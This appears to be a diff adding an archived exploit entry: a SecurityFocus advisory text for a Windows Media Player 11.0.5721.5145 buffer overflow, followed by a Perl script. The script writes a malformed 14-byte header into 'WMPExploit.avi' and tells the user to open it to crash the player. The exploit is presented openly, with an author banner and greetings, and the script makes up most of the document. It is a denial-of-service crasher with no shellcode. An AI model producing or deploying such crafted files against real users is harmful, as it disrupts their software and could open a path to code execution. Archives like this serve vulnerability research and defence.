@@ -1,0 +1,56 @@
+source: http://www.securityfocus.com/bid/47112/info
+
+Microsoft Windows Media Player is prone to a buffer-overflow vulnerability because it fails to perform adequate boundary checks on user-supplied data.
+
+Attackers may leverage this issue to execute arbitrary code in the context of the application. Failed attacks will cause denial-of-service conditions.
+
+Microsoft Windows Media Player 11.0.5721.5145 is vulnerable; other versions may also be affected. 
+
+#!/usr/bin/perl
+#(+)Exploit Title: Windows Media player 11.0.5721.5145 Buffer overflow/DOS Exploit
+#(+)Software  : Windows Media player
+#(+)Version   : 11.0.5721.5145
+#(+)Tested On : WIN-XP SP3
+#(+) Date     : 31.03.2011
+#(+) Hour     : 13:37 
+#Similar Bug was found by cr4wl3r in MediaPlayer Classic
+
+system("color 6");
+system("title Windows Media player 11.0.5721.5145 Buffer overflow/DOS Exploit");
+print "
+_______________________________________________________________________
+																	
+(+)Exploit Title:  Windows Media player 11.0.5721.5145 Buffer overflow/DOS Exploit
+ 
+		
+(+) Software  : Windows Media player
+(+) Version   : 11.0.5721.5145									
+(+) Tested On : WIN-XP SP3												
+(+) Date      : 31.03.2011												
+(+) Hour      : 13:37 PM													
+____________________________________________________________________\n	";
+sleep 2;
+system("cls");
+system("color 2");
+print "\nGenerating the exploit file !!!";
+sleep 2;
+print "\n\nWMPExploit.avi file generated!!";
+sleep 2;
+$theoverflow = "\x4D\x54\x68\x64\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00";
+ 
+open(file, "> WMPExploit.avi");
+print (file $theoverflow);
+print "\n\n(+) Done!\n
+(+) Now Just open WMPExplot.avi with Windows Media player and Kaboooommm !! ;) \n
+(+) Most of the times there is a crash\n whenever you open the folder where the WMPExploit.avi is stored :D \n";
+
+sleep 3;
+system("cls");
+sleep 1;
+system("color C");
+print "\n\n\n########################################################################\n
+(+)Exploit Coded by: ^Xecuti0N3r\n
+(+)^Xecuti0N3r: E-mail : xecuti0n3r@yahoo.com \n
+(+)Special Thanks to: MaxCaps, d3M0l!tioN3r & aNnIh!LatioN3r \n
+########################################################################\n\n";
+system("pause");
